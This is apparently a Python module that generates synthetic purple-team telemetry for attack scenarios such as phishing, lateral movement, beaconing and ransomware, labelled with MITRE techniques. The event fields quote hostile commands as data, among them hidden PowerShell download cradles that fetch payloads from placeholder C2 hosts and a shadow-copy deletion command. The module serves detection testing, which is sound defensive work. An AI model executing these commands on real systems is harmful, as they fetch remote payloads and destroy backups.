"""Simulation Engine for generating synthetic purple team telemetry and IOCs."""

import random
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional


class SimulationEngine:
    """Generates synthetic telemetry representing realistic adversary behaviors."""

    @staticmethod
    def generate_scenario_telemetry(scenario_name: str, custom_params: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        """Generate synthetic telemetry logs for a given scenario without executing real actions."""
        now = datetime.now(timezone.utc)
        events = []
        
        # Determine source IP and hostname
        src_ip = custom_params.get("src_ip", f"192.168.12.{random.randint(100, 250)}") if custom_params else f"192.168.12.{random.randint(100, 250)}"
        dest_host = custom_params.get("host", "corp-dc-01") if custom_params else "corp-dc-01"
        target_user = custom_params.get("user", "adm_local") if custom_params else "adm_local"
        
        if scenario_name == "Phishing":
            # Phishing scenario
            t_base = now - timedelta(minutes=15)
            # Step 1: Inbound Email Received
            events.append({
                "timestamp": (t_base).isoformat(),
                "time": (t_base).isoformat(),
                "event_type": "phishing",
                "attack_type": "phishing",
                "ip": src_ip,
                "host": dest_host,
                "user": target_user,
                "severity": "Medium",
                "mitre_technique": "T1566 - Phishing",
                "failed_logins": 0.0,
                "port_attempts": 0.0,
                "request_rate": 1.2,
                "details": {
                    "phase": "Initial Access",
                    "subject": "Urgent: Direct Deposit Information Update Required",
                    "sender": "payroll-update@secure-hr-portal.com",
                    "recipient": f"{target_user}@company.com",
                    "action": "Email delivered to inbox",
                    "attachment": "direct_deposit_form.pdf.exe",
                    "url": "http://hr-portal.company-verify.net/login"
                }
            })
            # Step 2: Link Clicked / Payload Executed
            t_click = t_base + timedelta(minutes=4)
            events.append({
                "timestamp": (t_click).isoformat(),
                "time": (t_click).isoformat(),
                "event_type": "phishing",
                "attack_type": "phishing",
                "ip": src_ip,
                "host": f"{target_user}-workstation",
                "user": target_user,
                "severity": "High",
                "mitre_technique": "T1204.002 - User Execution: Malicious File",
                "failed_logins": 0.0,
                "port_attempts": 0.0,
                "request_rate": 2.5,
                "details": {
                    "phase": "Execution",
                    "action": "User clicked attachment link",
                    "process_spawned": "cmd.exe /c start /B powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri http://c2.evil-site.org/payload.ps1\"",
                    "parent_process": "outlook.exe"
                }
            })

        elif scenario_name == "Password Spraying":
            # Password Spraying scenario
            t_base = now - timedelta(minutes=20)
            users_list = ["admin", "jsmith", "root", "operator", "backup", "db_admin", "guest", "test"]
            for i, user in enumerate(users_list):
                t_event = t_base + timedelta(seconds=i * 20)
                events.append({
                    "timestamp": t_event.isoformat(),
                    "time": t_event.isoformat(),
                    "event_type": "credential_stuffing",
                    "attack_type": "credential_stuffing",
                    "ip": src_ip,
                    "host": "auth-gateway-primary",
                    "user": user,
                    "severity": "Medium",
                    "mitre_technique": "T1110.003 - Brute Force: Password Spraying",
                    "failed_logins": float(i + 1),
                    "port_attempts": 0.0,
                    "request_rate": 45.0,
                    "details": {
                        "phase": "Credential Access",
                        "auth_method": "Active Directory NTLM",
                        "password_attempted": "Spring2026!",
                        "result": "Failure - Bad Password"
                    }
                })

        elif scenario_name == "SSH Brute Force":
            # SSH Brute Force
            t_base = now - timedelta(minutes=10)
            for i in range(15):
                t_event = t_base + timedelta(seconds=i * 10)
                events.append({
                    "timestamp": t_event.isoformat(),
                    "time": t_event.isoformat(),
                    "event_type": "ssh_bruteforce",
                    "attack_type": "ssh_bruteforce",
                    "ip": src_ip,
                    "host": dest_host,
                    "user": "root" if i < 10 else "invalid_operator",
                    "severity": "High" if i >= 5 else "Medium",
                    "mitre_technique": "T1110.001 - Brute Force: Password Guessing",
                    "failed_logins": float(i + 1),
                    "port_attempts": 0.0,
                    "request_rate": 80.0,
                    "details": {
                        "phase": "Credential Access",
                        "protocol": "SSHv2",
                        "port": 22,
                        "auth_status": "Failure",
                        "ssh_banner": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4"
                    }
                })

        elif scenario_name == "Port Scan":
            # Port Scan
            t_base = now - timedelta(minutes=8)
            ports = [21, 22, 23, 25, 80, 110, 139, 443, 445, 1433, 3306, 3389, 8080]
            for i, port in enumerate(ports):
                t_event = t_base + timedelta(seconds=i * 5)
                events.append({
                    "timestamp": t_event.isoformat(),
                    "time": t_event.isoformat(),
                    "event_type": "port_scan",
                    "attack_type": "port_scan",
                    "ip": src_ip,
                    "host": dest_host,
                    "user": "system",
                    "severity": "Medium",
                    "mitre_technique": "T1046 - Network Scanning",
                    "failed_logins": 0.0,
                    "port_attempts": float(i + 1),
                    "request_rate": 150.0,
                    "details": {
                        "phase": "Discovery",
                        "scan_type": "SYN Stealth Scan",
                        "destination_port": port,
                        "flag_pattern": "S"
                    }
                })

        elif scenario_name == "Privilege Escalation":
            # Privilege Escalation
            t_base = now - timedelta(minutes=5)
            # Step 1: Enumeration of vulnerable services
            events.append({
                "timestamp": t_base.isoformat(),
                "time": t_base.isoformat(),
                "event_type": "privilege_escalation",
                "attack_type": "privilege_escalation",
                "ip": "127.0.0.1",
                "host": dest_host,
                "user": "limited_user",
                "severity": "Low",
                "mitre_technique": "T1082 - System Information Discovery",
                "failed_logins": 0.0,
                "port_attempts": 0.0,
                "request_rate": 5.0,
                "details": {
                    "phase": "Discovery",
                    "action": "systeminfo executed",
                    "command": "systeminfo & wmic qfe list brief"
                }
            })
            # Step 2: Exploitation of Service Binary
            t_exploit = t_base + timedelta(minutes=2)
            events.append({
                "timestamp": t_exploit.isoformat(),
                "time": t_exploit.isoformat(),
                "event_type": "privilege_escalation",
                "attack_type": "privilege_escalation",
                "ip": "127.0.0.1",
                "host": dest_host,
                "user": "SYSTEM",
                "severity": "High",
                "mitre_technique": "T1068 - Exploitation for Privilege Escalation",
                "failed_logins": 0.0,
                "port_attempts": 0.0,
                "request_rate": 15.0,
                "details": {
                    "phase": "Privilege Escalation",
                    "vulnerable_binary": "C:\\Program Files\\Intel\\IntelHS\\HS_Service.exe",
                    "exploit_class": "Unquoted Service Path / DLL Hijacking",
                    "action": "spawned cmd.exe as SYSTEM"
                }
            })

        elif scenario_name == "Lateral Movement":
            # Lateral Movement
            t_base = now - timedelta(minutes=12)
            # Step 1: Admin session discovery
            events.append({
                "timestamp": t_base.isoformat(),
                "time": t_base.isoformat(),
                "event_type": "lateral_movement",
                "attack_type": "lateral_movement",
                "ip": src_ip,
                "host": dest_host,
                "user": "domain_admin_svc",
                "severity": "Medium",
                "mitre_technique": "T1021.002 - Remote Services: SMB/Windows Admin Shares",
                "failed_logins": 0.0,
                "port_attempts": 0.0,
                "request_rate": 12.0,
                "details": {
                    "phase": "Lateral Movement",
                    "action": "connection to C$ share",
                    "target_share": f"\\\\{dest_host}\\C$",
                    "ipc_mechanism": "SMB Pipe over Port 445"
                }
            })
            # Step 2: Remote service invocation (PsExec)
            t_exec = t_base + timedelta(minutes=3)
            events.append({
                "timestamp": t_exec.isoformat(),
                "time": t_exec.isoformat(),
                "event_type": "lateral_movement",
                "attack_type": "lateral_movement",
                "ip": src_ip,
                "host": dest_host,
                "user": "domain_admin_svc",
                "severity": "High",
                "mitre_technique": "T1569.002 - System Services: Service Execution",
                "failed_logins": 0.0,
                "port_attempts": 0.0,
                "request_rate": 20.0,
                "details": {
                    "phase": "Execution",
                    "action": "PsExec service installed",
                    "service_name": "PSEXECSVC",
                    "command_run": "powershell.exe -e aHlwZXJfY29tcGxleF9iZWFjb25fcGF5bG9hZA=="
                }
            })

        elif scenario_name == "Beaconing":
            # Beaconing
            t_base = now - timedelta(minutes=30)
            # Standard repeated connections every 10 seconds
            for i in range(12):
                t_event = t_base + timedelta(seconds=i * 10)
                events.append({
                    "timestamp": t_event.isoformat(),
                    "time": t_event.isoformat(),
                    "event_type": "beaconing",
                    "attack_type": "beaconing",
                    "ip": "203.0.113.88",
                    "host": f"{target_user}-workstation",
                    "user": target_user,
                    "severity": "Medium",
                    "mitre_technique": "T1071.001 - Application Layer Protocol: Web Protocols",
                    "failed_logins": 0.0,
                    "port_attempts": 0.0,
                    "request_rate": 12.0 + (i * 0.1),
                    "details": {
                        "phase": "Command and Control",
                        "destination_url": "http://ads.net-advertising.org/stats.php",
                        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "jitter": "1.2%",
                        "bytes_sent": 340,
                        "bytes_received": 120
                    }
                })

        elif scenario_name == "Suspicious PowerShell":
            # Suspicious PowerShell
            t_base = now - timedelta(minutes=4)
            events.append({
                "timestamp": t_base.isoformat(),
                "time": t_base.isoformat(),
                "event_type": "suspicious_powershell",
                "attack_type": "suspicious_powershell",
                "ip": "127.0.0.1",
                "host": dest_host,
                "user": target_user,
                "severity": "High",
                "mitre_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell",
                "failed_logins": 0.0,
                "port_attempts": 0.0,
                "request_rate": 8.0,
                "details": {
                    "phase": "Execution",
                    "cmdline": "powershell.exe -NoP -NonI -W Hidden -Enc SQB4AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIABoAHQAdABwADoALwAvAGMALgBlAHYAaQBsAC4AbwByAGcALwBwAGEAeQBsAG8AYQBkAA==",
                    "decoded_command": "Invoke-WebRequest -Uri http://c.evil.org/payload",
                    "entropy": 6.88
                }
            })

        elif scenario_name == "Data Exfiltration":
            # Data Exfiltration
            t_base = now - timedelta(minutes=15)
            # Step 1: Archiving Files (T1074)
            events.append({
                "timestamp": t_base.isoformat(),
                "time": t_base.isoformat(),
                "event_type": "data_exfiltration",
                "attack_type": "data_exfiltration",
                "ip": "127.0.0.1",
                "host": "prod-sql-01",
                "user": "backup_service",
                "severity": "Medium",
                "mitre_technique": "T1074 - Data Staged",
                "failed_logins": 0.0,
                "port_attempts": 0.0,
                "request_rate": 2.0,
                "details": {
                    "phase": "Collection",
                    "action": "Archive created via 7-Zip",
                    "archive_file": "C:\\Windows\\Temp\\db_backup_confidential.zip",
                    "files_compressed": ["users.mdf", "contracts.pdf", "keys.bin"]
                }
            })
            # Step 2: Upload to Cloud (T1567)
            t_upload = t_base + timedelta(minutes=5)
            events.append({
                "timestamp": t_upload.isoformat(),
                "time": t_upload.isoformat(),
                "event_type": "data_exfiltration",
                "attack_type": "data_exfiltration",
                "ip": "185.190.140.21",
                "host": "prod-sql-01",
                "user": "backup_service",
                "severity": "High",
                "mitre_technique": "T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage",
                "failed_logins": 0.0,
                "port_attempts": 0.0,
                "request_rate": 500.0,
                "details": {
                    "phase": "Exfiltration",
                    "destination_ip": "185.190.140.21",
                    "bytes_exfiltrated": 450000000,
                    "target_platform": "MegaUpload API client",
                    "protocol": "HTTPS"
                }
            })

        elif scenario_name == "Ransomware":
            # Ransomware
            t_base = now - timedelta(minutes=6)
            # Step 1: Shadow copies deleted
            events.append({
                "timestamp": t_base.isoformat(),
                "time": t_base.isoformat(),
                "event_type": "ransomware",
                "attack_type": "ransomware",
                "ip": "127.0.0.1",
                "host": dest_host,
                "user": "administrator",
                "severity": "High",
                "mitre_technique": "T1490 - Inhibit System Recovery",
                "failed_logins": 0.0,
                "port_attempts": 0.0,
                "request_rate": 10.0,
                "details": {
                    "phase": "Impact",
                    "command": "vssadmin.exe delete shadows /all /quiet",
                    "action": "VSS backup shadow copies purged"
                }
            })
            # Step 2: Mass encryption
            t_encrypt = t_base + timedelta(minutes=2)
            events.append({
                "timestamp": t_encrypt.isoformat(),
                "time": t_encrypt.isoformat(),
                "event_type": "ransomware",
                "attack_type": "ransomware",
                "ip": "127.0.0.1",
                "host": dest_host,
                "user": "administrator",
                "severity": "High",
                "mitre_technique": "T1486 - Data Encrypted for Impact",
                "failed_logins": 0.0,
                "port_attempts": 0.0,
                "request_rate": 1200.0,
                "details": {
                    "phase": "Impact",
                    "files_affected": 2480,
                    "file_extension": ".locked",
                    "key_length": "AES-256-CBC"
                }
            })

        else:
            # Custom / Miscellaneous Scenario
            t_base = now - timedelta(minutes=5)
            events.append({
                "timestamp": t_base.isoformat(),
                "time": t_base.isoformat(),
                "event_type": "custom_scenario",
                "attack_type": "custom_scenario",
                "ip": src_ip,
                "host": dest_host,
                "user": target_user,
                "severity": "Medium",
                "mitre_technique": "T1078 - Valid Accounts",
                "failed_logins": 0.0,
                "port_attempts": 0.0,
                "request_rate": 10.0,
                "details": {
                    "phase": "Initial Access",
                    "reason": "Custom purple team activity check",
                    "custom_param_count": len(custom_params) if custom_params else 0
                }
            })

        return events
